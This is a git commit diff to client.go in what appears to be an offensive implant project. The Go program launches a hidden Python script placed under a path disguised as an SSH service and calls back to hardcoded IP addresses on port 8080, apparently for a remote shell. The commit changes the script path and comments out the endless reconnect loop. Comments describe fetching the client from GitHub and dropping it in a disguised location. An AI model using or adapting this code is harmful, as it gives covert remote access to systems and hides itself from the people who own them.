0161af7c1efa1bb2e18780456987bf772838abca
Drew Young <dmy625@comcast.net>
2022-10-11 21:23:22 -0400

    updated client.go to not always call client

--- client.go
+++ client.go
@@ -11,7 +11,7 @@ func shell(ip string, port string) {
 	//mkdir /var/lib/sshd/totallysshd.py
 	//curl client.py from github and drop it at /var/lib/sshd/totallysshd.py
 
-	cmd := exec.Command("/usr/bin/python3", "/var/lib/sshd/.sshb.py", ip, port) //execute the command
+	cmd := exec.Command("/usr/bin/python3", "/var/lib/sshb/.sshb.py", ip, port) //execute the command
 	err := cmd.Run()                                                            //define err by running cmd
 	if err != nil {
 		fmt.Printf("%s", "broken") //if there is an error, re-loop
@@ -22,12 +22,12 @@ func shell(ip string, port string) {
 
 func main() {
 	ips := []string{"129.21.49.57", "10.100.0.1"}
-	for {
-		for i, s := range ips { //iterate over the IP addresses
-			go shell(s, "8080")     //run a client as a thread
-			time.Sleep(time.Second) //sleep for a second before starting the other threads
-			_ = i                   //not using i
-		}
-		time.Sleep(10 * time.Second) //sleep for 5 minutes then try to reconnect again
+	// for {
+	for i, s := range ips { //iterate over the IP addresses
+		go shell(s, "8080")     //run a client as a thread
+		time.Sleep(time.Second) //sleep for a second before starting the other threads
+		_ = i                   //not using i
 	}
+	// 	time.Sleep(10 * time.Second) //sleep for 5 minutes then try to reconnect again
+	// }
 }
